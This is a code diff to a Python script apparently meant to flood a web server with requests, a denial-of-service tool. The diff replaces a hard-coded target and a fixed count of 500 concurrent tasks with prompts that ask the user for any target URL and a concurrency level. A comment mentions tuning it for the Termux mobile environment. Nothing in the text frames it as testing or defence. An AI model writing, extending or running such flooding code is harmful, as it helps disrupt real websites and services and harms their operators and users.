@@ -37,17 +37,24 @@ async def flood(session, target_url):
             print(f"Request failed: {e}")
 
 # Async entry point
-async def main(target_url):
+async def main(target_url, num_threads):
     async with aiohttp.ClientSession() as session:
         tasks = []
-        # Launch 500 asynchronous flood tasks
-        for _ in range(500):  # Adjust this based on how much Termux can handle
+        # Launch asynchronous flood tasks
+        for _ in range(num_threads):
             tasks.append(flood(session, target_url))
         
         # Run the tasks
         await asyncio.gather(*tasks)
 
-target_url = "http://example.com"  # Replace with your target URL
+# Get user input for target URL and number of threads
+if __name__ == "__main__":
+    target_url = input("Enter the target URL: ")
+    try:
+        num_threads = int(input("Enter the number of concurrent threads (e.g., 500): "))
+    except ValueError:
+        print("Invalid input, defaulting to 500 threads.")
+        num_threads = 500
 
-# Run the asynchronous main function
-asyncio.run(main(target_url))
+    # Run the asynchronous main function
+    asyncio.run(main(target_url, num_threads))
